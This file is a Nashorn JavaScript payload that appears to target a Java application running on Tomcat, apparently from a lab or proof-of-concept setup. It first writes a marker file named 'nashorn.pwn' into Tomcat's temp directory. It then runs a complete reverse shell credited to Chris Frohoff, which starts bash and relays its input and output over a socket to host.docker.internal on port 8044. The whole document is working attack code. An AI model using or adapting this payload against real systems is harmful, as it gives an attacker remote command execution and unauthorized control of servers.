// First let's write a file.
var command = ["touch", "/usr/local/tomcat/temp/nashorn.pwn"];
var processBuilder = new java.lang.ProcessBuilder(command).start();

// Now let's start the reverse shell.
// Author: Chris Frohoff (https://gist.github.com/frohoff/a976928e3c1dc7c359f8)
var host="host.docker.internal";
var port=8044;
var cmd="bash";

var p = new java.lang.ProcessBuilder(cmd)
            .redirectErrorStream(true)
            .start();

var s = new java.net.Socket(host,port);
var pi = p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
var po=p.getOutputStream(), so=s.getOutputStream();

while(!s.isClosed()){
  while(pi.available()>0)
    so.write(pi.read());
    while(pe.available()>0)
      so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
        so.flush();
        po.flush();
        java.lang.Thread.sleep(50);
        try {
          p.exitValue();
          break;
        } catch (e) { }
        };
        p.destroy();
        s.close();